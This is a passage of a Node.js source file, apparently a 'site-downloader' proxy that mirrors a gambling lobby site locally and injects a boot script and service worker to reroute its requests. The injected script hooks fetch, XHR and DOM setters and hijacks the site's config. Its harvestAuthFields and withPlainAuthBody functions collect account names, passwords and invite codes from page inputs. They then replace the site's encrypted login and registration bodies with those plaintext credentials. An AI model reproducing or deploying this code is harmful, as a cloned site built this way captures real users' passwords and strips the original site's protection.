const path = require('path');
const { URL } = require('url');
const axios = require('axios');
const { applySystemProxy } = require('./system-proxy');
applySystemProxy({ log: false });

const PROXY_PREFIX = '/__sd_proxy__';
const BOOT_PATH = '/__sd_boot.js';
const SW_PATH = '/__sd_sw.js';

/** 本地应优先走磁盘的路径（构建产物）；其余同源请求基地址改为源站 */
const LOCAL_STATIC_PREFIX_RE = /^\/(assets|libs|vendors|v1assets|v1fonts|v1locales|cocos|__sd_)\b/i;

const STATIC_PATH_EXT_RE = /\.(?:js|mjs|cjs|css|map|json|wasm|png|jpe?g|gif|webp|avif|svg|ico|woff2?|ttf|otf|mp4|webm|mp3|m4a|txt|xml|lottie)(?:$|\?)/i;

/** @deprecated 保留兼容；实际以 isLikelySameOriginApiPath 为准 */
const SAME_ORIGIN_API_PREFIX_RE = /^\/(member|api|apis|promo|promo_v2|gameapi|game|hall|auth|pay|wallet|agent|user|webapi|gateway|cdn-cgi)\b/i;

function isLocalStaticPath(pathname) {
  const p = String(pathname || '');
  if (!p || p === '/') return false;
  if (LOCAL_STATIC_PREFIX_RE.test(p)) return true;
  if (STATIC_PATH_EXT_RE.test(p)) return true;
  return false;
}

function isLikelySameOriginApiPath(pathname, search) {
  const p = String(pathname || '');
  if (!p || p === '/') return false;
  if (isLocalStaticPath(p)) return false;
  if (SAME_ORIGIN_API_PREFIX_RE.test(p)) return true;
  if (search && /(?:^|[?&])pa=/.test(search)) return true;
  return false;
}

function isFetchLikeRequest(req) {
  const headers = (req && req.headers) || {};
  const dest = String(headers['sec-fetch-dest'] || '').toLowerCase();
  if (dest === 'document' || dest === 'iframe' || dest === 'frame') return false;
  if (dest === 'empty') return true;
  const accept = String(headers.accept || '').toLowerCase();
  if (accept.includes('application/json')) return true;
  if (headers['x-requested-with']) return true;
  const method = String((req && req.method) || 'GET').toUpperCase();
  if (method !== 'GET' && method !== 'HEAD' && method !== 'OPTIONS') return true;
  return false;
}

const HOP_BY_HOP = new Set([
  'connection',
  'keep-alive',
  'proxy-authenticate',
  'proxy-authorization',
  'te',
  'trailers',
  'transfer-encoding',
  'upgrade',
  'host',
  'content-length'
]);

function resolveSourceOrigin(siteDir, fs, path) {
  try {
    const manifestPath = path.join(siteDir, 'manifest.json');
    if (fs.existsSync(manifestPath)) {
      const manifest = JSON.parse(fs.readFileSync(manifestPath, 'utf8'));
      if (manifest && manifest.source) {
        return new URL(manifest.source).origin;
      }
    }
  } catch (_) { /* ignore */ }
  try {
    return 'https://' + path.basename(siteDir);
  } catch (_) {
    return '';
  }
}

function parseProxyTarget(reqUrl) {
  const parsed = typeof reqUrl === 'string'
    ? new URL(reqUrl, 'http://127.0.0.1')
    : reqUrl;
  if (!parsed.pathname.startsWith(PROXY_PREFIX)) return null;

  const rest = parsed.pathname.slice(PROXY_PREFIX.length);
  let target = '';
  if (parsed.searchParams.has('url')) {
    target = parsed.searchParams.get('url') || '';
  } else if (rest.startsWith('/')) {
    target = decodeURIComponent(rest.slice(1));
  }
  if (!target) return null;

  let url;
  try {
    url = new URL(target);
  } catch (_) {
    return null;
  }
  if (url.protocol !== 'http:' && url.protocol !== 'https:') return null;
  return url;
}

function normalizeBootCfg(adapterHostsOrCfg) {
  if (Array.isArray(adapterHostsOrCfg)) {
    return {
      hosts: adapterHostsOrCfg,
      apiHostPatterns: [],
      excludeHosts: [],
      ossHosts: [],
      ossOrigin: '',
      upstreamOrigin: ''
    };
  }
  const c = adapterHostsOrCfg && typeof adapterHostsOrCfg === 'object' ? adapterHostsOrCfg : {};
  const ossHosts = Array.isArray(c.ossHosts) ? c.ossHosts.map(String) : [];
  if (c.ossOrigin) {
    try {
      const h = new URL(String(c.ossOrigin)).hostname;
      if (h && !ossHosts.includes(h)) ossHosts.push(h);
    } catch (_) { /* ignore */ }
  }
  return {
    hosts: Array.isArray(c.hosts) ? c.hosts : [],
    apiHostPatterns: Array.isArray(c.apiHostPatterns) ? c.apiHostPatterns : [],
    excludeHosts: Array.isArray(c.excludeHosts) ? c.excludeHosts : [],
    ossHosts,
    ossOrigin: c.ossOrigin ? String(c.ossOrigin) : '',
    upstreamOrigin: c.upstreamOrigin ? String(c.upstreamOrigin) : '',
    lobbyGameUrl: c.lobbyGameUrl ? String(c.lobbyGameUrl) : ''
  };
}

function buildBootScript(sourceOrigin, adapterHostsOrCfg) {
  const cfg = normalizeBootCfg(adapterHostsOrCfg);
  const origin = JSON.stringify(sourceOrigin || '');
  const prefix = JSON.stringify(PROXY_PREFIX + '/');
  const hostsJson = JSON.stringify(cfg.hosts);
  const patternsJson = JSON.stringify(cfg.apiHostPatterns);
  const excludeJson = JSON.stringify(cfg.excludeHosts);
  const ossHostsJson = JSON.stringify(cfg.ossHosts || []);
  const lobbyGameUrlJson = JSON.stringify(cfg.lobbyGameUrl || '');
  return `/*! site-downloader preview proxy boot */
(function () {
  var SOURCE_ORIGIN = ${origin};
  var PROXY_PREFIX = ${prefix};
  var ADAPTER_HOSTS = ${hostsJson};
  var API_HOST_PATTERNS = ${patternsJson};
  var EXCLUDE_HOSTS = ${excludeJson};
  var OSS_HOSTS = ${ossHostsJson};
  var LOBBY_GAME_URL = ${lobbyGameUrlJson};
  if (!SOURCE_ORIGIN) return;
  if (window.__SD_PROXY_BOOT__) return;
  window.__SD_PROXY_BOOT__ = true;
  if (LOBBY_GAME_URL) window.lobby_game_url = LOBBY_GAME_URL;

  var LOCAL_ORIGIN = location.origin;
  var ADAPTER_HOST_SET = {};
  for (var hi = 0; hi < ADAPTER_HOSTS.length; hi++) ADAPTER_HOST_SET[String(ADAPTER_HOSTS[hi]).toLowerCase()] = true;
  var EXCLUDE_HOST_SET = {};
  for (var ei = 0; ei < EXCLUDE_HOSTS.length; ei++) EXCLUDE_HOST_SET[String(EXCLUDE_HOSTS[ei]).toLowerCase()] = true;
  var OSS_HOST_SET = {};
  for (var oi = 0; oi < OSS_HOSTS.length; oi++) OSS_HOST_SET[String(OSS_HOSTS[oi]).toLowerCase()] = true;
  var API_HOST_REGS = [];
  for (var pi = 0; pi < API_HOST_PATTERNS.length; pi++) {
    try { API_HOST_REGS.push(new RegExp(String(API_HOST_PATTERNS[pi]), 'i')); } catch (e) {}
  }

  function absUrl(input) {
    try {
      if (typeof input === 'string') return new URL(input, location.href).href;
      if (typeof URL !== 'undefined' && input instanceof URL) return input.href;
      if (input && typeof input.href === 'string' && typeof input.hostname === 'string') return String(input.href);
      if (input && typeof input.url === 'string') return new URL(input.url, location.href).href;
    } catch (e) {}
    return null;
  }

  function toProxy(href) {
    return PROXY_PREFIX + encodeURIComponent(href);
  }

  /** 仅按站点 adapter-hosts.json 的 hosts / patterns / exclude 判断 */
  function isAdapterApiHost(hostname) {
    if (!hostname) return false;
    var h = String(hostname).toLowerCase();
    if (EXCLUDE_HOST_SET[h]) return false;
    if (ADAPTER_HOST_SET[h]) return true;
    for (var i = 0; i < API_HOST_REGS.length; i++) {
      if (API_HOST_REGS[i].test(h)) return true;
    }
    return false;
  }

  /** OSS/图片 CDN（oniw*）：远端防盗链，必须改本地 */
  function isOssHost(hostname) {
    if (!hostname) return false;
    var h = String(hostname).toLowerCase();
    if (OSS_HOST_SET[h]) return true;
    if (/^oniw\\d*\\./i.test(h)) return true;
    return false;
  }

  /**
   * 改写到本地短 path：
   * - 业务 API（/hall/api、/api）→ adapter / 上游
   * - 已下载的 OSS 静态（siteadmin、lobby_asset、图片后缀）→ 本地磁盘，缺了再回源
   * 其它跨域仍走 __sd_proxy__
   */
  function isMirroredAssetPath(pathname) {
    var p = pathname || '';
    // 只认本地下载过的镜像目录；其它 CDN 图走 __sd_proxy__ 保留原 host
    if (p.indexOf('/siteadmin/') === 0) return true;
    if (p.indexOf('/lobby_asset/') === 0) return true;
    if (p.indexOf('/game_pictures/') === 0) return true;
    if (p.indexOf('/active/') === 0) return true;
    if (p.indexOf('/upload/') !== -1) return true;
    return false;
  }

  function isLocalShortPath(pathname) {
    var p = pathname || '';
    if (p.indexOf('/hall/api/') === 0 || p.indexOf('/api/') === 0) return true;
    return isMirroredAssetPath(p);
  }

  function isAuthApiPath(pathname) {
    var p = pathname || '';
    return /\\/(?:hall\\/)?api\\/member\\/(?:login|agent\\/login|register|fastRegister|check\\/register|v2\\/fastLogin|getFastLogin|thirdPartyLogin)(?:\\/|$)/.test(p);
  }

  /** 从登录/注册表单采集明文账密（请求体是 AES，适配层解不了） */
  window.__sdAuthFields = { account: '', password: '', invite: '' };
  function lookLikeAccountInput(el) {
    if (!el || el.tagName !== 'INPUT') return false;
    var t = String(el.type || 'text').toLowerCase();
    if (t === 'password' || t === 'hidden' || t === 'checkbox' || t === 'radio' || t === 'submit' || t === 'button') return false;
    var id = ((el.name || '') + ' ' + (el.id || '') + ' ' + (el.placeholder || '') + ' ' + (el.autocomplete || '')).toLowerCase();
    if (/pass|pwd|senha|otp|code|captcha|verify/.test(id)) return false;
    if (/user|account|login|phone|email|mobile|tel|nome|conta/.test(id)) return true;
    return t === 'text' || t === 'tel' || t === 'email' || t === 'number';
  }
  function harvestAuthFields() {
    try {
      var inputs = document.querySelectorAll('input');
      var account = '';
      var password = '';
      var invite = '';
      for (var i = 0; i < inputs.length; i++) {
        var el = inputs[i];
        if (!el || el.disabled || el.readOnly) continue;
        var val = String(el.value || '');
        if (!val) continue;
        var meta = ((el.name || '') + ' ' + (el.id || '') + ' ' + (el.placeholder || '')).toLowerCase();
        var typ = String(el.type || '').toLowerCase();
        if (typ === 'password' || /pass|pwd|senha/.test(meta)) password = val;
        else if (/invite|checkcode|ncheck|referral|agent/.test(meta)) invite = val;
        else if (lookLikeAccountInput(el)) account = val;
      }
      if (account) window.__sdAuthFields.account = account;
      if (password) window.__sdAuthFields.password = password;
      if (invite) window.__sdAuthFields.invite = invite;
    } catch (e) {}
    return window.__sdAuthFields;
  }
  document.addEventListener('input', function () { harvestAuthFields(); }, true);
  document.addEventListener('change', function () { harvestAuthFields(); }, true);
  document.addEventListener('click', function () { harvestAuthFields(); }, true);

  function withPlainAuthBody(href, body) {
    try {
      var u = new URL(href, LOCAL_ORIGIN);
      if (!isAuthApiPath(u.pathname)) return body;
      var fields = harvestAuthFields();
      if (!fields.account && !fields.password) return body;
      var base = {};
      if (typeof body === 'string') {
        try { base = JSON.parse(body); } catch (e) { base = { encryptString: body }; }
      } else if (body && typeof body === 'object') {
        base = body;
      }
      // 保留密文供排查，同时附带明文供本地 adapter → wgame
      return JSON.stringify({
        username: fields.account,
        account: fields.account,
        userpass: fields.password,
        password: fields.password,
        inviteCode: fields.invite || undefined,
        encryptString: base.encryptString || undefined,
        _sdPlain: 1
      });
    } catch (e) {
      return body;
    }
  }

  function planUrl(href) {
    try {
      var u = new URL(href);
      if (u.protocol !== 'http:' && u.protocol !== 'https:') return null;
      if (u.origin === LOCAL_ORIGIN) return null;
      // 业务 API 一律改本地短 path。oniw OSS 只允许 GET 对象；POST 打上去会 405 MethodNotAllowed
      if (u.pathname.indexOf('/hall/api/') === 0 || u.pathname.indexOf('/api/') === 0) {
        return LOCAL_ORIGIN + u.pathname + u.search + u.hash;
      }
      // OSS(oniw)：已下载的图片/静态走本地；version.json 等元数据必须回源（本地 404 会触发域名探测失败→整页图闪没）
      if (isOssHost(u.hostname)) {
        if (isMirroredAssetPath(u.pathname)) {
          return LOCAL_ORIGIN + u.pathname + u.search + u.hash;
        }
        return toProxy(href);
      }
      // 其它业务 API 主机 → 本地短 path
      if (isAdapterApiHost(u.hostname) && isLocalShortPath(u.pathname)) {
        return LOCAL_ORIGIN + u.pathname + u.search + u.hash;
      }
      // 其它跨域 → 本地代理
      return toProxy(href);
    } catch (e) {
      return null;
    }
  }

  /**
   * 官网图片组件会把失败 URL 记进 localStorage（lobby@image@cache@error，约 5 分钟）。
   * key 会把 ossHost 归一成 {$WG_BUCKET_SITE$}，所以之前 oniw 403 后，本地同 path 也会被当成失败：
   * 先画出真图 → initAssets 命中失败缓存 → 换成 1x1 透明图（一闪而过）。
   */
  try {
    localStorage.removeItem('lobby@image@cache@error');
    localStorage.removeItem('lobby@image@cache@success');
    localStorage.removeItem('lobby@image@cache');
  } catch (e) {}

  /** 把响应/样式里的 oniw OSS 域名改成本地；并强制 bucket 模式让 ossHost=location.origin */
  function localizeOssInText(text) {
    if (!text || typeof text !== 'string') return text;
    var out = text;
    if (out.indexOf('{$WG_BUCKET_SITE$}') !== -1) {
      out = out.replace(/\\{\\$WG_BUCKET_SITE\\$\\}/g, LOCAL_ORIGIN);
    }
    // 强制站点走「OSS=当前页 origin」，避免 ping/回切把图片域名改回 oniw 后整页重绘闪没
    if (out.indexOf('siteBucketSwitchStatus') !== -1) {
      out = out.replace(/"siteBucketSwitchStatus"\\s*:\\s*\\d+/g, '"siteBucketSwitchStatus":1');
    }
    if (out.indexOf('oss_domain') !== -1) {
      out = out.replace(/"oss_domain"\\s*:\\s*\\[[^\\]]*\\]/g, '"oss_domain":["' + LOCAL_ORIGIN + '"]');
    }
    if (out.indexOf('oniw') === -1 && out.indexOf('://') === -1) return out;
    out = out.replace(/https?:\\/\\/oniw\\d*\\.679win\\.(?:cc|me|co|net)/gi, LOCAL_ORIGIN);
    for (var i = 0; i < OSS_HOSTS.length; i++) {
      var host = String(OSS_HOSTS[i] || '');
      if (!host) continue;
      out = out.split('https://' + host).join(LOCAL_ORIGIN);
      out = out.split('http://' + host).join(LOCAL_ORIGIN);
    }
    return out;
  }

  /** img/script 等属性赋值不走 XHR，需单独改写到代理 */
  function rewriteMediaUrl(v) {
    if (!v || typeof v !== 'string') return v;
    if (v.indexOf('__sd_proxy__') !== -1) return v;
    v = localizeOssInText(v);
    var href = absUrl(v);
    var next = href && planUrl(href);
    return next || v;
  }

  /** CSS url("https://oniw.../game_pictures/...") → 本地短 path */
  function rewriteCssUrls(text) {
    if (!text || typeof text !== 'string') return text;
    text = localizeOssInText(text);
    if (text.indexOf('url(') === -1) {
      // Vue 有时直接赋裸 URL
      if (/^https?:\\/\\//i.test(text.trim())) return rewriteMediaUrl(text.trim());
      return text;
    }
    return text.replace(/url\\((['\"]?)([^)'\"]+)\\1\\)/gi, function (_m, q, raw) {
      var cleaned = String(raw || '').trim();
      if (!cleaned || cleaned.indexOf('data:') === 0) return _m;
      var next = rewriteMediaUrl(cleaned);
      if (!next || next === cleaned) return _m;
      return 'url(' + (q || '"') + next + (q || '"') + ')';
    });
  }

  // 官网启动脚本稍后会写 LOBBY_SITE_CONFIG；提前劫持，把 ossBaseUrl 指到本地
  try {
    var __sdLobbyCfg;
    Object.defineProperty(window, 'LOBBY_SITE_CONFIG', {
      configurable: true,
      enumerable: true,
      get: function () { return __sdLobbyCfg; },
      set: function (v) {
        __sdLobbyCfg = v;
        try {
          if (v && typeof v === 'object') {
            if ('ossBaseUrl' in v) v.ossBaseUrl = LOCAL_ORIGIN + '/';
            if ('bucketSite' in v) v.bucketSite = LOCAL_ORIGIN;
            if ('ossHost' in v) v.ossHost = LOCAL_ORIGIN.replace(/\\/$/, '');
          }
        } catch (e) {}
      }
    });
  } catch (e) {}

  try {
    var metas = document.querySelectorAll('meta[name="siteinfos"]');
    for (var mi = 0; mi < metas.length; mi++) {
      var content = metas[mi].getAttribute('content') || '';
      if (content.indexOf('ossBaseUrl') !== -1) {
        metas[mi].setAttribute('content', localizeOssInText(content));
      }
    }
  } catch (e) {}

  try {
    var imgProto = window.HTMLImageElement && HTMLImageElement.prototype;
    if (imgProto) {
      var srcDesc = Object.getOwnPropertyDescriptor(imgProto, 'src');
      if (srcDesc && srcDesc.set) {
        Object.defineProperty(imgProto, 'src', {
          configurable: true,
          enumerable: srcDesc.enumerable,
          get: srcDesc.get,
          set: function (v) { return srcDesc.set.call(this, rewriteMediaUrl(v)); }
        });
      }
    }

    // Vue/内联样式常用 backgroundImage，不走 <img src>
    var cssProto = window.CSSStyleDeclaration && CSSStyleDeclaration.prototype;
    if (cssProto) {
      ['background', 'backgroundImage', 'cssText'].forEach(function (prop) {
        var desc = Object.getOwnPropertyDescriptor(cssProto, prop);
        if (desc && desc.set) {
          Object.defineProperty(cssProto, prop, {
            configurable: true,
            enumerable: desc.enumerable,
            get: desc.get,
            set: function (v) { return desc.set.call(this, rewriteCssUrls(String(v == null ? '' : v))); }
          });
        }
      });
      if (typeof cssProto.setProperty === 'function') {
        var rawSetProp = cssProto.setProperty;
        cssProto.setProperty = function (name, value, priority) {
          var n = String(name || '').toLowerCase();
          if ((n === 'background' || n === 'background-image' || n === 'css-text') && typeof value === 'string') {
            value = rewriteCssUrls(value);
          }
          return rawSetProp.call(this, name, value, priority);
        };
      }
    }

    var rawSetAttr = Element.prototype.setAttribute;
    Element.prototype.setAttribute = function (name, value) {
      var n = String(name || '').toLowerCase();
      if ((n === 'src' || n === 'href' || n === 'poster' || n === 'srcset') && typeof value === 'string') {
        if (n === 'srcset') {
          value = value.split(',').map(function (part) {
            var bits = part.trim().split(/\\s+/);
            if (bits[0]) bits[0] = rewriteMediaUrl(bits[0]);
            return bits.join(' ');
          }).join(', ');
        } else {
          value = rewriteMediaUrl(value);
        }
      } else if (n === 'style' && typeof value === 'string') {
        value = rewriteCssUrls(value);
      }
      return rawSetAttr.call(this, name, value);
    };
  } catch (e) {}

  /** 把荷载里的本地 origin 换成源站（如 RUM location 字段） */
  function rewriteJsonText(text) {
    if (!text || typeof text !== 'string') return text;
    if (text.indexOf(LOCAL_ORIGIN) === -1) return text;
    try {
      return JSON.stringify(rewriteUrlsInValue(JSON.parse(text)));
    } catch (e) {
      return text.split(LOCAL_ORIGIN).join(SOURCE_ORIGIN);
    }
  }

  function rewriteUrlsInValue(v) {
    if (typeof v === 'string') {
      return v.indexOf(LOCAL_ORIGIN) === -1 ? v : v.split(LOCAL_ORIGIN).join(SOURCE_ORIGIN);
    }
    if (Array.isArray(v)) {
      for (var i = 0; i < v.length; i++) v[i] = rewriteUrlsInValue(v[i]);
      return v;
    }
    if (v && typeof v === 'object') {
      for (var k in v) {
        if (Object.prototype.hasOwnProperty.call(v, k)) v[k] = rewriteUrlsInValue(v[k]);
      }
      return v;
    }
    return v;
  }

  function rewriteBodySync(data) {
    if (data == null) return data;
    if (typeof data === 'string') return rewriteJsonText(data);
    if (typeof URLSearchParams !== 'undefined' && data instanceof URLSearchParams) {
      return new URLSearchParams(rewriteJsonText(data.toString()));
    }
    if (typeof ArrayBuffer !== 'undefined' && data instanceof ArrayBuffer) {
      var dec = typeof TextDecoder !== 'undefined' ? new TextDecoder().decode(data) : '';
      if (!dec || dec.indexOf(LOCAL_ORIGIN) === -1) return data;
      var enc = typeof TextEncoder !== 'undefined' ? new TextEncoder().encode(rewriteJsonText(dec)) : null;
      return enc ? enc.buffer : data;
    }
    if (typeof Uint8Array !== 'undefined' && data instanceof Uint8Array) {
      return rewriteBodySync(data.buffer);
    }
    return data;
  }

  function rewriteBodyAsync(data) {
    if (data == null) return Promise.resolve(data);
    if (typeof Blob !== 'undefined' && data instanceof Blob) {
      return data.text().then(function (text) {
        if (!text || text.indexOf(LOCAL_ORIGIN) === -1) return data;
        return new Blob([rewriteJsonText(text)], { type: data.type || 'application/json' });
      });
    }
    if (typeof Request !== 'undefined' && data instanceof Request) {
      return data.clone().text().then(function (text) {
        var rewritten = rewriteJsonText(text);
        return new Request(data, { body: rewritten === text ? undefined : rewritten });
      }).catch(function () { return data; });
    }
    return Promise.resolve(rewriteBodySync(data));
  }

  var rawFetch = window.fetch;
  if (typeof rawFetch === 'function') {
    window.fetch = function (input, init) {
      var href = absUrl(input);
      var next = href && planUrl(href);
      var body = init && init.body;
      var rumLike = !!(href && href.indexOf('cdn-cgi/rum') !== -1);
      var needBody = !!(body && (next || rumLike));
      var self = this;

      function wrapResponse(res) {
        try {
          var ct = (res.headers && res.headers.get && res.headers.get('content-type')) || '';
          if (!/json|text|javascript|css|xml|svg/i.test(ct)) return res;
          return res.text().then(function (text) {
            var rewritten = localizeOssInText(text);
            return new Response(rewritten, {
              status: res.status,
              statusText: res.statusText,
              headers: res.headers
            });
          });
        } catch (e) {
          return res;
        }
      }

      function dispatch(finalInit) {
        if (next || (href && isAuthApiPath((function () { try { return new URL(href).pathname; } catch (e) { return ''; } })()))) {
          var authHref = next || href;
          if (finalInit && finalInit.body != null) {
            finalInit = Object.assign({}, finalInit);
            finalInit.body = withPlainAuthBody(authHref, finalInit.body);
          }
        }
        var p;
        if (next) {
          if (input && typeof input === 'object' && typeof Request !== 'undefined' && input instanceof Request) {
            p = rawFetch.call(self, new Request(next, finalInit || {}));
          } else {
            p = rawFetch.call(self, next, finalInit);
          }
        } else {
          p = rawFetch.call(self, input, finalInit);
        }
        return Promise.resolve(p).then(wrapResponse);
      }

      if (needBody) {
        return rewriteBodyAsync(body).then(function (b) {
          var opts = init ? Object.assign({}, init) : {};
          opts.body = b;
          return dispatch(opts);
        });
      }
      if (!next && !href) return rawFetch.apply(this, arguments);
      if (!next) {
        return Promise.resolve(rawFetch.apply(this, arguments)).then(wrapResponse);
      }
      if (input && typeof input === 'object' && typeof Request !== 'undefined' && input instanceof Request) {
        return Promise.resolve(rawFetch.call(this, new Request(next, init || input))).then(wrapResponse);
      }
      return Promise.resolve(rawFetch.call(this, next, init)).then(wrapResponse);
    };
  }

  var XO = window.XMLHttpRequest;
  if (XO) {
    var xoOpen = XO.prototype.open;
    var xoSend = XO.prototype.send;
    XO.prototype.open = function (method, url) {
      // 不能改 arguments[1]：严格模式下对 axios 的 XHR 无效，会仍直连远端 API 域
      var args = Array.prototype.slice.call(arguments);
      var href = absUrl(args[1]);
      this.__sdHref = href;
      var next = href && planUrl(href);
      if (next) {
        args[1] = next;
        this.__sdHref = next;
        this.__sdRewrote = href;
        try { console.info('[sd-adapter] xhr', href, '->', next); } catch (e) {}
      }
      return xoOpen.apply(this, args);
    };
    XO.prototype.send = function (body) {
      var self = this;
      var href = this.__sdHref || this.__sdRewrote || '';
      // 登录注册：用表单明文替换 AES 密文 body
      if (body != null && href) {
        body = withPlainAuthBody(href, body);
      }
      if (body != null && href && (href.indexOf('cdn-cgi/rum') !== -1 || String(this.__sdHref || '').indexOf(LOCAL_ORIGIN) === 0)) {
        if (typeof Blob !== 'undefined' && body instanceof Blob) {
          rewriteBodyAsync(body).then(function (b) { xoSend.call(self, b); });
          return;
        }
        body = rewriteBodySync(body);
      }
      return xoSend.call(this, body);
    };

    // axios 走 XHR：把响应里的 oniw URL 改成本地
    try {
      var rtDesc = Object.getOwnPropertyDescriptor(XO.prototype, 'responseText');
      if (rtDesc && rtDesc.get) {
        Object.defineProperty(XO.prototype, 'responseText', {
          configurable: true,
          enumerable: rtDesc.enumerable,
          get: function () {
            return localizeOssInText(rtDesc.get.call(this));
          }
        });
      }
      var respDesc = Object.getOwnPropertyDescriptor(XO.prototype, 'response');
      if (respDesc && respDesc.get) {
        Object.defineProperty(XO.prototype, 'response', {
          configurable: true,
          enumerable: respDesc.enumerable,
          get: function () {
            var v = respDesc.get.call(this);
            return typeof v === 'string' ? localizeOssInText(v) : v;
          }
        });
      }
    } catch (e) {}
  }

  /** 不再整页替换 aniw/oniw 域名：会把 ossDomain/图片地址也改坏 */

  if (navigator.sendBeacon) {
    var rawBeacon = navigator.sendBeacon.bind(navigator);
    navigator.sendBeacon = function (url, data) {
      var href = absUrl(url);
      var next = (href && planUrl(href)) || url;

      function fire(body) {
        try {
          if (rawBeacon(next, body)) return true;
        } catch (e) {}
        try {
          if (rawFetch) {
            rawFetch(next, { method: 'POST', body: body, keepalive: true, mode: 'same-origin' });
            return true;
          }
        } catch (e2) {}
        return false;
      }

      if (data == null) return fire(data);
      if (typeof data === 'string') return fire(rewriteJsonText(data));
      if (typeof Blob !== 'undefined' && data instanceof Blob) {
        data.text().then(function (text) {
          fire(new Blob([rewriteJsonText(text)], { type: data.type || 'application/json' }));
        });
        return true;
      }
      return fire(rewriteBodySync(data));
    };
  }

  if (navigator.serviceWorker) {
    var swUrl = ${JSON.stringify(SW_PATH + '?v=9')};
    navigator.serviceWorker.getRegistrations().then(function (regs) {
      return Promise.all((regs || []).map(function (r) { return r.unregister(); }));
    }).then(function () {
      return navigator.serviceWorker.register(swUrl, { scope: '/', updateViaCache: 'none' });
    }).then(function () {
      try { console.info('[sd-adapter] service worker v9 registered'); } catch (e) {}
    }).catch(function (err) {
      try { console.warn('[sd-adapter] sw register failed', err); } catch (e) {}
    });
  }

  try { console.info('[sd-adapter] boot ready', LOCAL_ORIGIN); } catch (e) {}
})();
`;
}

function buildServiceWorkerScript(adapterHostsOrCfg) {
  const cfg = normalizeBootCfg(adapterHostsOrCfg);
  const proxyPrefix = JSON.stringify(PROXY_PREFIX + '/');
  const hostsJson = JSON.stringify(cfg.hosts);
  const patternsJson = JSON.stringify(cfg.apiHostPatterns);
  const excludeJson = JSON.stringify(cfg.excludeHosts);
  const ossHostsJson = JSON.stringify(cfg.ossHosts || []);
  return `/*! site-downloader api adapter sw v10 */
self.addEventListener('install', function (e) { self.skipWaiting(); });
self.addEventListener('activate', function (e) { e.waitUntil(self.clients.claim()); });

var PROXY_PREFIX = ${proxyPrefix};
var ADAPTER_HOSTS = ${hostsJson};
var API_HOST_PATTERNS = ${patternsJson};
var EXCLUDE_HOSTS = ${excludeJson};
var OSS_HOSTS = ${ossHostsJson};
var ADAPTER_HOST_SET = {};
for (var hi = 0; hi < ADAPTER_HOSTS.length; hi++) ADAPTER_HOST_SET[String(ADAPTER_HOSTS[hi]).toLowerCase()] = true;
var EXCLUDE_HOST_SET = {};
for (var ei = 0; ei < EXCLUDE_HOSTS.length; ei++) EXCLUDE_HOST_SET[String(EXCLUDE_HOSTS[ei]).toLowerCase()] = true;
var OSS_HOST_SET = {};
for (var oi = 0; oi < OSS_HOSTS.length; oi++) OSS_HOST_SET[String(OSS_HOSTS[oi]).toLowerCase()] = true;
var API_HOST_REGS = [];
for (var pi = 0; pi < API_HOST_PATTERNS.length; pi++) {
  try { API_HOST_REGS.push(new RegExp(String(API_HOST_PATTERNS[pi]), 'i')); } catch (e) {}
}

function isApiHost(hostname) {
  var h = String(hostname || '').toLowerCase();
  if (!h || EXCLUDE_HOST_SET[h]) return false;
  if (ADAPTER_HOST_SET[h]) return true;
  for (var i = 0; i < API_HOST_REGS.length; i++) {
    if (API_HOST_REGS[i].test(h)) return true;
  }
  return false;
}

function isOssHost(hostname) {
  var h = String(hostname || '').toLowerCase();
  if (!h) return false;
  if (OSS_HOST_SET[h]) return true;
  if (/^oniw\\d*\\./i.test(h)) return true;
  return false;
}

function isMirroredAssetPath(pathname) {
  var p = pathname || '';
  if (p.indexOf('/siteadmin/') === 0) return true;
  if (p.indexOf('/lobby_asset/') === 0) return true;
  if (p.indexOf('/game_pictures/') === 0) return true;
  if (p.indexOf('/upload/') !== -1) return true;
  return false;
}

function isLocalShortPath(pathname) {
  var p = pathname || '';
  if (p.indexOf('/hall/api/') === 0 || p.indexOf('/api/') === 0) return true;
  return isMirroredAssetPath(p);
}

function relay(req, targetUrl) {
  return (async function () {
    var init = {
      method: req.method,
      headers: req.headers,
      credentials: 'same-origin',
      mode: 'same-origin',
      cache: 'no-store',
      redirect: 'follow'
    };
    if (req.method !== 'GET' && req.method !== 'HEAD') {
      init.body = await req.clone().arrayBuffer();
    }
    return fetch(targetUrl, init);
  })();
}

self.addEventListener('fetch', function (event) {
  var req = event.request;
  var url;
  try { url = new URL(req.url); } catch (e) { return; }
  if (url.origin === self.location.origin) return;

  // 业务 API 一律改本地短 path，禁止 POST 打到 oniw OSS（会 405 MethodNotAllowed）
  if (url.pathname.indexOf('/hall/api/') === 0 || url.pathname.indexOf('/api/') === 0) {
    var apiLocal = self.location.origin + url.pathname + url.search;
    event.respondWith(relay(req, apiLocal));
    return;
  }

  // OSS(oniw)：镜像静态→本地；version.json 等→代理回源（避免本地 404 触发 OSS 探测失败）
  if (isOssHost(url.hostname)) {
    if (isMirroredAssetPath(url.pathname)) {
      var ossLocal = self.location.origin + url.pathname + url.search;
      event.respondWith(relay(req, ossLocal));
      return;
    }
    var ossProxy = self.location.origin + PROXY_PREFIX + encodeURIComponent(req.url);
    event.respondWith(relay(req, ossProxy));
    return;
  }

  if (!isApiHost(url.hostname)) return;

  if (isLocalShortPath(url.pathname)) {
    var localUrl = self.location.origin + url.pathname + url.search;
    event.respondWith(relay(req, localUrl));
    return;
  }

  var proxyUrl = self.location.origin + PROXY_PREFIX + encodeURIComponent(req.url);
  event.respondWith(relay(req, proxyUrl));
});
`;
}
function injectBootIntoHtml(html, sourceOrigin, adapterHosts) {
  if (!sourceOrigin || !html) return html;
  if (html.includes('__SD_PROXY_BOOT__') || html.includes('data-sd-boot=')) return html;
  const raw = buildBootScript(sourceOrigin, adapterHosts);
  const safe = String(raw).replace(/<\/script/gi, '<\\/script');
  const tag = `<script data-sd-boot="1">${safe}</script>`;
  if (/<head[^>]*>/i.test(html)) {
    return html.replace(/<head([^>]*)>/i, `<head$1>${tag}`);
  }
  return tag + html;
}

function copyRequestHeaders(req, refererOrigin, options = {}) {
  const out = {};
  const headers = req.headers || {};
  const stripAuth = !!options.stripAuth;
  for (const key of Object.keys(headers)) {
    const lower = key.toLowerCase();
    if (HOP_BY_HOP.has(lower)) continue;
    if (lower === 'origin' || lower === 'referer') continue;
    if (lower === 'cookie') continue;
    if (lower === 'accept-encoding') continue;
    if (
      stripAuth
      && (
        lower === 'token'
        || lower === 'authorization'
        || lower === 'userid'
        || lower === 'user-id'
        || lower === 'useridx'
        || lower === 'session-key'
        || lower === 'session_key'
        || lower === 'x-session-key'
        || lower === 'jwt'
        || lower === 'jwt-token'
        || lower === 'jwt_token'
      )
    ) {
      continue;
    }
    out[key] = headers[key];
  }
  out['Accept-Encoding'] = 'identity';
  if (refererOrigin) {
